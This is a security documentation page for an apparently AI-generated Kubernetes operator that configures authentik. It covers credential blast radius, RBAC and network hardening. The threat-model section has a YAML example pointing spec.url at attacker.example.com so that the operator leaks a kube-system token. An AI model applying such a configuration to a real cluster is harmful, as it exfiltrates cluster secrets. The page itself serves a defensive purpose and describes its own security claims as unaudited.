# Security

!!! warning "This project is fully AI generated"

    No part of it has been through an independent human security audit. Its
    threat model, its RBAC and its handling of credentials were all written by a
    language model. Treat the properties described here as **intentions**, and
    verify them against the source before relying on them.

This operator is security-adjacent by construction. It holds authentik API
tokens, it can hold kubeconfigs for remote clusters and Docker host
credentials, and it generates OAuth2 client secrets. Compromising it is close to
compromising the identity provider it configures.

!!! info "The authoritative policy is `SECURITY.md`"

    `SECURITY.md` in the repository root is the canonical document: supported
    versions, the vulnerability reporting process and its response-time
    expectations, and the full hardening guidance. This page is an operational
    summary of the model, not a replacement.

## Reporting a vulnerability

**Do not open a public issue.** Report privately through GitHub private security
advisories — the repository's **Security → Advisories → Report a vulnerability**
page. That creates a thread visible only to the maintainers and to you.

Include the affected version or commit, the impact (what an attacker gains and
what access they need to start with), and reproduction steps if you have them.

Response-time expectations are in `SECURITY.md`. There is no bug bounty.

## What the operator can access

The controller-manager runs as a single `Deployment` in its own namespace: a
non-root user, a read-only root filesystem, `allowPrivilegeEscalation: false`,
every Linux capability dropped, and the `RuntimeDefault` seccomp profile. Within
those limits it has four kinds of reach.

1. **The Kubernetes API**, via its ServiceAccount. It watches its custom
   resources across all namespaces by default, reads `Secret`s referenced by
   connections, and writes `Secret`s holding generated credentials.
2. **The authentik REST API**, via tokens read from those `Secret`s. Whatever
   the token can do, the operator can do.
3. **Remote clusters and Docker hosts**, indirectly — it reads the credentials a
   service connection needs and passes them to authentik.
4. **The network**, including whatever `spec.url` points at. A connection object
   is a request for the operator to make an authenticated outbound HTTP call to
   an address the object's author chose.

!!! note "Operator logs are sensitive"

    The operator never logs token or secret values. It does record `Secret`
    names and namespaces in events, conditions and logs — which is a useful map
    of the cluster for an attacker. Treat the logs accordingly.

## Blast radius per credential

| Credential | Held where | If it leaks |
| --- | --- | --- |
| authentik API token | A `Secret` named by a connection | Full control of authentik up to the token's own permissions. An admin token can create users, rewrite flows, and mint access to every application authentik fronts. |
| Generated OAuth2 client secret | A `Secret` the operator writes | Impersonation of that client. Depending on the flow, that can mean signing in as arbitrary users of the application. |
| SAML signing key material | A `Secret` referenced by a `SAMLProvider` | Forged assertions — sign-in as any user, at any service provider trusting that key. |
| Kubeconfig (`KubernetesServiceConnection`) | A `Secret` referenced by the connection | Whatever it grants in the target cluster. Outpost deployment requires creating workloads, so these are rarely low-privilege. |
| Docker credentials (`DockerServiceConnection`) | A `Secret` referenced by the connection | Control of the Docker daemon, which on most hosts is equivalent to root on that host. |
| The operator's ServiceAccount token | Projected into the manager Pod | Read access to every `Secret` the operator may read, plus the ability to rewrite the resources it manages. |

## The sharpest edge: `ClusterAuthentikConnection`

!!! danger "Creating one is a cluster-admin-level privilege"

    A `ClusterAuthentikConnection` is cluster-scoped and names, in its own spec,
    the namespace its token `Secret` lives in — and that field accepts **any**
    namespace. The operator therefore holds cluster-wide `get secrets`.

    Anyone who can create or update one can make the operator read any `Secret`
    in the cluster. Combined with a `spec.url` they control, they can have the
    operator send it to them as a bearer token.

    Treat `create` and `update` on this kind as equivalent to cluster-wide
    `get secrets`.

```yaml
spec:
  url: https://attacker.example.com   # a host they own
  tokenSecretRef:
    namespace: kube-system            # not theirs
    name: some-controller-token
    key: token
```

Nothing there is a bug. It is the inherent cost of a cluster-scoped credential
reference, which is why the RBAC guidance below is blunt.

### What the design does guarantee

!!! success "The token is resolved only from `spec.tokenSecretRef.namespace`"

    Never from the namespace of the resource that referenced the connection, and
    never from the operator's own namespace. There is no fallback and no
    default; a connection whose spec does not name a namespace is rejected.

    This closes the classic operator privilege-escalation bug: a tenant in
    namespace `A` cannot reference a cluster connection and have the operator
    quietly pick up a `Secret` of their choosing. They get exactly the `Secret`
    the cluster administrator who wrote the connection selected.

    Recorded as a binding constraint in
    [ADR 0001](../decisions/0001-connection-scope.md), not as a convention.

The namespaced `AuthentikConnection` carries **no** cross-namespace reach at
all: its `tokenSecretRef` has no `namespace` field. Creating one manufactures no
privilege — if you can create it in a namespace, you could already read that
namespace's `Secret`s.

A tenant referencing a cluster connection obtains the **use** of a token, never
its bytes. The operator does not copy it into their namespace, echo it in
`status`, or log it.

## Hardening

### Scope the authentik token

Create a dedicated authentik service account rather than reusing a human
administrator's token. Grant it only what the kinds you actually use require —
if you never create outposts, it needs no outpost permissions.

Give each tenant or environment its own token and its own `AuthentikConnection`.
A single shared admin token behind a `ClusterAuthentikConnection` collapses every
tenant into one blast radius.

Rotate on a schedule. The operator rereads its `Secret`, so rotation is a
`Secret` update — see [Creating an API token](../getting-started/api-token.md#rotating-the-token).

### Restrict who may create connections

Connection objects are the privilege boundary. Providers and applications are
comparatively harmless; connections are not.

- `ClusterAuthentikConnection`: cluster administrators only. It belongs in no
  role bound to tenants, application teams or CI service accounts.
- `AuthentikConnection`: per namespace, to the team owning it. Creating one also
  chooses which `Secret` in that namespace the operator reads, so it is roughly
  equivalent to `get secrets` there.
- **Audit both.** A new `ClusterAuthentikConnection` in a cluster that did not
  expect one is a strong signal.
- **Constrain the fields.** A ValidatingAdmissionPolicy, Kyverno or Gatekeeper
  rule restricting `spec.url` to an allowlist of hostnames and
  `spec.tokenSecretRef.namespace` to a known set turns "any secret, anywhere it
  likes" into "a known secret, to a known endpoint".

A tenant role that grants the namespaced kinds and nothing else is shown in
[Connections](../guides/connections.md#rbac-guidance).

### Limit the operator's own reach

- Set `watchNamespaces` to the namespaces you actually use.
- Keep `metrics.secure: true` (the default) so the metrics endpoint requires a
  token that passes a SubjectAccessReview.
- Keep `enableHTTP2: false` (the default) — HTTP/2 has a history of
  denial-of-service CVEs and these endpoints gain nothing from it.
- Do not grant RBAC beyond the generated `manager-role`. If you never install
  `ClusterAuthentikConnection`, strip the cluster-wide `get secrets` that exists
  only to serve it.
- Run the operator in its own namespace with no other workloads, so a namespace
  compromise does not hand over its ServiceAccount token.

### Network policy

The operator needs egress to the Kubernetes API server and to your authentik
endpoint. Nothing else.

- Default-deny egress on the operator namespace, then allow only those two. If
  authentik is in the same cluster, target it by namespace and pod selector
  rather than by IP.
- Ingress only from your metrics scraper on the metrics port, and the kubelet on
  the probe port.

!!! tip "This is the cheapest meaningful mitigation available"

    With egress locked down, a hostile `spec.url` cannot reach an
    attacker-controlled endpoint. It does not remove the underlying privilege —
    a cluster-internal endpoint is still reachable — but it blunts the
    `ClusterAuthentikConnection` exfiltration path considerably.

A `NetworkPolicy` can be shipped with the release via the chart's `extraObjects`
value.

### Protect the generated secrets

The `Secret`s the operator writes hold live OAuth2 client secrets.

- Enable [encryption at rest](https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/).
- Scope `get secrets` in those namespaces to the workloads that need them.
- Remember that anything syncing `Secret`s out of the cluster — GitOps tooling,
  backup jobs, log shippers — extends the blast radius with it.

See [Credentials](../guides/credentials.md) for the lifecycle.

## Safety defaults worth knowing

Two defaults exist specifically to prevent quiet damage. Both are documented as
architecture decisions, and both can be overridden — deliberately.

[`adoptionPolicy: FailOnConflict`](../decisions/0002-adoption-policy.md)

:   The operator refuses to take over a pre-existing authentik object with a
    matching name. authentik keys objects by name/slug rather than by Kubernetes
    UID, so collisions are routine — and silent adoption is how an operator
    quietly overwrites a hand-tuned production object. For an identity provider
    that means rotated client secrets and a broken login. `AdoptExisting` is the
    explicit opt-in.

[Two connection scopes](../decisions/0001-connection-scope.md)

:   The namespaced kind is the documented default precisely because it
    manufactures no privilege. The cluster-scoped kind exists for single-tenant
    clusters and is a deliberate, auditable opt-in.

## AI-generation provenance

Every file in this repository was generated by an AI system. For security review
specifically:

- **Plausible-looking controls may do nothing.** Generated code can produce a
  check that reads correctly and validates nothing. The cross-namespace `Secret`
  resolution rule above is exactly the kind of control worth verifying against
  the source rather than trusting the prose.
- **The threat model is asserted, not derived.** It was not produced by
  adversarial review of a running system.
- **Dependencies were chosen by generation**, not by a supply-chain policy.

If you are evaluating this for production, treat it as unreviewed third-party
code from an anonymous author, because functionally that is what it is. Security
reports are genuinely welcome.

## See also

- `SECURITY.md` in the repository root — the canonical policy.
- [Connections](../guides/connections.md) — the two kinds, and RBAC for them.
- [Credentials](../guides/credentials.md) — generated secrets and rotation.
- [ADR 0001](../decisions/0001-connection-scope.md), [ADR 0002](../decisions/0002-adoption-policy.md)
